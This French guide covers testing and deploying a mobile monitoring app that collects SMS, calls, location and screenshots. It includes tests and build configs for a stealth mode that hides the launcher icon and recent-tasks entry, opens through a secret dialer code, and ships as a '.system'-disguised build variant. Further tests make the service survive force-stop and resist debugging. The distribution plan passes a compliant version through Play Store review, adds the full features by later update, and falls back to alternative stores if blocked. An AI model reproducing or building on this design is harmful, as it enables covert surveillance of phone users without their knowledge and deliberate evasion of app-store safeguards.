# Guide de Tests et Déploiement - Application Surveillée

## 1. Stratégie de tests spécifique

### 1.1 Particularités des tests

**Défis uniques de test :**
```
Contraintes spécifiques :
- Tests en arrière-plan continu
- Simulation longue durée (72h+)
- Permissions système étendues
- Modes furtifs à valider
- Impact batterie critique
- Services natifs complexes

Approche adaptée :
- Tests d'endurance prioritaires
- Automation maximale
- Métriques batterie détaillées
- Tests sur devices réels
- Scénarios multi-jours
```

### 1.2 Environnements de test

**Configuration des environnements :**
```
Devices de test requis :
- Android : Min 5 devices physiques
  - Différents constructeurs (Samsung, Xiaomi, Pixel)
  - Versions 8.0 à 14
  - Avec/sans optimisations agressives
  
- iOS : Min 3 devices
  - iPhone récent + ancien
  - iOS 13 à 17
  - Différentes capacités batterie

Environnements :
1. Lab interne : Tests continus
2. Beta testers : Usage réel
3. Monitoring prod : Métriques live
```

## 2. Tests unitaires spécifiques

### 2.1 Tests des collectors

**Testing des collecteurs de données :**
```kotlin
// Test SMS Collector
class SmsCollectorTest {
  @Mock lateinit var contentResolver: ContentResolver
  @Mock lateinit var cursor: Cursor
  
  @Test
  fun testSmsExtraction() {
    // Given
    whenever(cursor.moveToNext()).thenReturn(true, true, false)
    whenever(cursor.getString(SMS_BODY_COLUMN)).thenReturn("Test message")
    whenever(cursor.getLong(SMS_DATE_COLUMN)).thenReturn(System.currentTimeMillis())
    
    // When
    val messages = smsCollector.extractMessages(cursor)
    
    // Then
    assertEquals(2, messages.size)
    assertEquals("Test message", messages[0].body)
  }
  
  @Test
  fun testKeywordDetection() {
    val message = SmsMessage(
      body = "URGENT: Please call me",
      sender = "+1234567890"
    )
    
    val keywords = listOf("urgent", "help", "emergency")
    assertTrue(smsCollector.containsKeywords(message, keywords))
  }
}

// Test Location Collector
class LocationCollectorTest {
  @Test
  fun testAdaptiveAccuracy() {
    // Test battery > 50%
    val request = locationCollector.buildRequest(batteryLevel = 75)
    assertEquals(PRIORITY_HIGH_ACCURACY, request.priority)
    assertEquals(60_000L, request.interval)
    
    // Test battery < 30%
    val lowBatteryRequest = locationCollector.buildRequest(batteryLevel = 25)
    assertEquals(PRIORITY_LOW_POWER, lowBatteryRequest.priority)
    assertEquals(900_000L, lowBatteryRequest.interval)
  }
}
```

### 2.2 Tests des services

**Testing des services background :**
```kotlin
class BackgroundServiceTest {
  @Test
  fun testServiceRestart() {
    // Simulate service kill
    service.stopSelf()
    
    // Wait for restart
    Thread.sleep(5000)
    
    // Verify service restarted
    assertTrue(isServiceRunning(BackgroundService::class.java))
  }
  
  @Test
  fun testBatteryOptimization() {
    // Mock battery level
    setBatteryLevel(20)
    
    // Verify collectors adapted
    verify(locationCollector).switchToLowPowerMode()
    verify(mediaCollector).disable()
    verify(syncService).extendIntervals()
  }
}
```

## 3. Tests d'intégration

### 3.1 Tests end-to-end

**Scénarios complets de surveillance :**
```kotlin
class MonitoringE2ETest {
  @Test
  fun testCompleteMonitoringFlow() {
    // 1. Pairing
    val pairingCode = "123456"
    enterPairingCode(pairingCode)
    waitForPairing()
    
    // 2. Permissions
    grantAllPermissions()
    
    // 3. Data collection
    sendTestSms()
    makeTestCall()
    moveToNewLocation()
    
    // 4. Verify sync
    Thread.sleep(SYNC_INTERVAL)
    verifyDataSynced()
  }
  
  @Test
  fun testEmergencyMode() {
    // Trigger emergency
    triggerEmergencyViaButton()
    
    // Verify intensive collection
    Thread.sleep(5000)
    assertTrue(isCollectingIntensively())
    
    // Verify notifications sent
    verifyEmergencyNotificationSent()
  }
}
```

### 3.2 Tests de résistance

**Tests de robustesse système :**
```kotlin
class ResilienceTest {
  @Test
  fun testSurvivalToForceStop() {
    // Force stop app
    executeShellCommand("am force-stop $PACKAGE_NAME")
    
    // Wait for recovery
    Thread.sleep(10000)
    
    // Verify service running again
    assertTrue(isServiceRunning())
  }
  
  @Test
  fun testDozeModeSurvival() {
    // Enter Doze mode
    executeShellCommand("dumpsys deviceidle force-idle")
    
    // Wait 1 hour
    Thread.sleep(3600_000)
    
    // Verify still collecting critical data
    assertTrue(isCollectingInDoze())
  }
}
```

## 4. Tests de performance

### 4.1 Tests de batterie

**Mesure de consommation batterie :**
```kotlin
class BatteryPerformanceTest {
  @Test
  fun test24HourBatteryUsage() {
    val startBattery = getBatteryLevel()
    val startTime = System.currentTimeMillis()
    
    // Run for 24 hours
    while (System.currentTimeMillis() - startTime < 24 * 3600 * 1000) {
      Thread.sleep(60_000) // Check every minute
      logBatteryLevel()
    }
    
    val endBattery = getBatteryLevel()
    val drain = startBattery - endBattery
    
    // Assert less than 10% drain
    assertTrue("Battery drain: $drain%", drain < 10)
  }
  
  @Test
  fun testBatteryUsageByComponent() {
    val profiler = BatteryProfiler()
    
    // Profile each component
    val results = mapOf(
      "GPS" to profiler.profile { runGpsFor(60_000) },
      "Sync" to profiler.profile { performSync() },
      "Screenshot" to profiler.profile { captureScreenshot() }
    )
    
    // Log results
    results.forEach { (component, usage) ->
      Log.d("Battery", "$component: ${usage.percentUsed}%")
    }
  }
}
```

### 4.2 Tests de mémoire

**Détection de fuites mémoire :**
```kotlin
class MemoryLeakTest {
  @Test
  fun testLongRunningMemoryStability() {
    val initialMemory = getMemoryUsage()
    
    // Run for 48 hours
    repeat(48 * 60) { // Every minute for 48h
      // Simulate normal operations
      simulateDataCollection()
      simulateSync()
      
      // Force GC
      System.gc()
      
      // Check memory
      val currentMemory = getMemoryUsage()
      assertTrue(
        "Memory leak detected: ${currentMemory - initialMemory}MB",
        currentMemory - initialMemory < 50 // Max 50MB growth
      )
      
      Thread.sleep(60_000)
    }
  }
}
```

## 5. Tests de sécurité

### 5.1 Tests anti-tampering

**Validation des protections :**
```kotlin
class SecurityTest {
  @Test
  fun testRootDetection() {
    // Simulate rooted device
    enableMagiskHide()
    
    // Verify detection
    assertTrue(antiTamper.isDeviceRooted())
    
    // Verify degraded mode
    assertTrue(isRunningInDegradedMode())
  }
  
  @Test
  fun testDebugProtection() {
    // Attach debugger
    Debug.waitForDebugger()
    
    // Verify detection and protection
    assertTrue(antiDebug.isBeingDebugged())
    assertFalse(areSensitiveFeaturesEnabled())
  }
  
  @Test
  fun testDataEncryption() {
    // Collect sensitive data
    val smsData = collectTestSms()
    
    // Verify encrypted in database
    val dbData = readDirectlyFromDb("messages")
    assertNotEquals(smsData.body, dbData.body)
    
    // Verify can decrypt correctly
    val decrypted = decrypt(dbData.body)
    assertEquals(smsData.body, decrypted)
  }
}
```

### 5.2 Tests de modes furtifs

**Validation du camouflage :**
```kotlin
class StealthModeTest {
  @Test
  fun testInvisibleMode() {
    // Enable invisible mode
    enableInvisibleMode()
    
    // Verify no launcher icon
    assertFalse(isAppVisibleInLauncher())
    
    // Verify no recent tasks
    assertFalse(isInRecentTasks())
    
    // Verify minimal notification
    val notification = getActiveNotifications().firstOrNull()
    assertEquals(IMPORTANCE_MIN, notification?.importance)
  }
  
  @Test
  fun testSecretCodeAccess() {
    // Enter secret code
    sendDialerCode("*#*#8233#*#*")
    
    // Verify app opened
    waitForActivity(MainActivity::class.java)
    assertTrue(isActivityVisible(MainActivity::class.java))
  }
}
```

## 6. Tests automatisés CI/CD

### 6.1 Pipeline de tests

**Configuration GitHub Actions :**
```yaml
name: Monitored App Tests

on:
  push:
    branches: [main, develop]
  pull_request:

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup JDK
        uses: actions/setup-java@v3
        with:
          java-version: '17'
          
      - name: Run unit tests
        run: ./gradlew testDebugUnitTest
        
      - name: Upload coverage
        uses: codecov/codecov-action@v3

  instrumented-tests:
    runs-on: macos-latest
    strategy:
      matrix:
        api-level: [26, 29, 31, 33]
    steps:
      - uses: actions/checkout@v3
      
      - name: Run instrumented tests
        uses: reactivecircus/android-emulator-runner@v2
        with:
          api-level: ${{ matrix.api-level }}
          script: ./gradlew connectedDebugAndroidTest

  battery-tests:
    runs-on: self-hosted # Physical device required
    steps:
      - name: Run battery tests
        run: ./gradlew runBatteryTests
        
      - name: Analyze battery stats
        run: python analyze_battery.py
```

### 6.2 Tests sur Firebase Test Lab

**Configuration pour tests réels :**
```gradle
// build.gradle
testLab {
    devices {
        pixel4(ManagedVirtualDevice) {
            device = "Pixel 4"
            apiLevel = 30
            systemImageSource = "google"
        }
        
        // Physical devices
        galaxyS21(FtlDevice) {
            deviceIds = ["galaxy_s21"]
        }
        
        xiaomiNote(FtlDevice) {
            deviceIds = ["xiaomi_note_10"]
        }
    }
    
    testTargets {
        all {
            testTimeout = "45m"
        }
    }
}
```

## 7. Stratégie de déploiement

### 7.1 Build variants

**Configuration des variantes :**
```gradle
android {
    buildTypes {
        debug {
            applicationIdSuffix ".debug"
            versionNameSuffix "-DEBUG"
            buildConfigField "String", "API_URL", '"https://dev-api.safeconnect.com"'
            
            // Debug features
            buildConfigField "boolean", "ENABLE_LOGGING", "true"
            buildConfigField "boolean", "SKIP_ANTI_DEBUG", "true"
        }
        
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 
                         'proguard-rules.pro'
            
            buildConfigField "String", "API_URL", '"https://api.safeconnect.com"'
            buildConfigField "boolean", "ENABLE_LOGGING", "false"
            buildConfigField "boolean", "SKIP_ANTI_DEBUG", "false"
            
            // Additional obfuscation
            buildConfigField "boolean", "ENABLE_OBFUSCATION", "true"
        }
        
        stealth {
            initWith release
            applicationIdSuffix ".system"
            manifestPlaceholders = [
                appName: "@string/app_name_stealth",
                appIcon: "@mipmap/ic_launcher_stealth"
            ]
        }
    }
}
```

### 7.2 Signature et obfuscation

**Configuration ProGuard avancée :**
```proguard
# Keep native methods
-keepclasseswithmembernames class * {
    native <methods>;
}

# Keep collectors
-keep class com.xpsafeconnect.monitored.collectors.** { *; }

# Obfuscate aggressively
-repackageclasses ''
-allowaccessmodification
-optimizations !code/simplification/arithmetic,!code/simplification/cast,!field/*,!class/merging/*

# Remove logs
-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** v(...);
    public static *** i(...);
}

# Encrypt strings
-include string-encryption-rules.pro
```

## 8. Distribution

### 8.1 Canaux de distribution

**Stratégies de déploiement :**
```
Distribution channels :
1. Direct APK : Installation manuelle
2. Private store : Entreprise MDM
3. Alternative stores : Si bloqué
4. Web install : PWA fallback
5. Companion app : Play Store légal

Play Store considerations :
- Version allégée conforme
- Fonctionnalités complètes via update
- Respect strict des policies
- Backup plan si rejet
```

### 8.2 Updates et patches

**Système de mise à jour :**
```kotlin
class UpdateManager {
  fun checkForUpdates() {
    // Check version on server
    api.getLatestVersion { latestVersion ->
      if (latestVersion > BuildConfig.VERSION_CODE) {
        when (latestVersion.priority) {
          CRITICAL -> forceUpdate()
          HIGH -> promptUpdate()
          NORMAL -> scheduleUpdate()
        }
      }
    }
  }
  
  private fun downloadAndInstall(apkUrl: String) {
    // Download APK
    val apkFile = downloadFile(apkUrl)
    
    // Verify signature
    if (!verifyApkSignature(apkFile)) {
      throw SecurityException("Invalid APK signature")
    }
    
    // Install
    installApk(apkFile)
  }
}
```

## 9. Monitoring post-déploiement

### 9.1 Métriques critiques

**KPIs à surveiller :**
```
Métriques vitales :
- Taux de survie service : > 99%
- Battery drain moyen : < 8%/jour
- Taux de sync réussi : > 95%
- Crashes : < 0.1%
- ANR : < 0.05%

Monitoring setup :
class ProductionMonitor {
  fun reportMetrics() {
    val metrics = collectMetrics()
    
    analytics.log("service_uptime", metrics.uptimePercent)
    analytics.log("battery_impact", metrics.batteryDrainPerHour)
    analytics.log("sync_success_rate", metrics.syncSuccessRate)
    analytics.log("data_collected", metrics.dataPointsPerDay)
    
    if (metrics.anyBelowThreshold()) {
      alertOps(metrics)
    }
  }
}
```

### 9.2 Rollback strategy

**Plan de rollback d'urgence :**
```
Critères de rollback :
- Battery drain > 15%/jour
- Service uptime < 90%
- Crash rate > 1%
- Security compromise

Procédure :
1. Désactiver nouvelles installs
2. Push config pour désactiver features
3. Notification utilisateurs
4. Rollback côté serveur
5. Force update vers version stable
```

## 10. Documentation technique

### 10.1 Guide d'installation

**Instructions détaillées :**
```markdown
# Installation Monitored App

## Prérequis
- Android 8.0+ ou iOS 13+
- 100MB espace libre
- Permissions administrateur (recommandé)

## Installation Android
1. Activer sources inconnues
2. Télécharger APK depuis lien sécurisé
3. Installer et ouvrir
4. Suivre assistant configuration
5. Accorder toutes permissions
6. Entrer code jumelage

## Mode furtif
1. Après installation normale
2. Aller dans Paramètres > Avancés
3. Activer "Mode système"
4. L'app disparaîtra du launcher
5. Accès via code *#*#8233#*#*
```

### 10.2 Troubleshooting

**Guide de résolution :**
```
Problèmes courants :

Service s'arrête :
- Vérifier optimisation batterie
- Désactiver économiseurs agressifs
- Ajouter en liste blanche

Sync échoue :
- Vérifier connexion internet
- Réinitialiser permissions
- Clear cache et retry

Battery drain élevé :
- Réduire fréquence GPS
- Désactiver features non essentielles
- Vérifier wake locks
```

## 11. Maintenance et évolutions

### 11.1 Roadmap technique

**Évolutions planifiées :**
```
Q1 2024 :
- Migration vers Work Profiles
- Support Android 14 restrictions
- Optimisation Doze mode v2

Q2 2024 :
- Machine learning pour battery
- Compression vidéo avancée
- Support 5G optimizations

Q3 2024 :
- Blockchain audit trail
- Quantum-resistant crypto
- Edge AI processing
```

### 11.2 Dette technique

**Gestion de la dette :**
```
Priorités refactoring :
1. Migration vers Kotlin Coroutines
2. Modularisation par feature
3. Dependency injection cleanup
4. Tests coverage > 80%
5. Documentation inline

Métriques dette :
- Complexité cyclomatique
- Duplication de code
- Dependencies obsolètes
- TODO/FIXME count
- Build time
```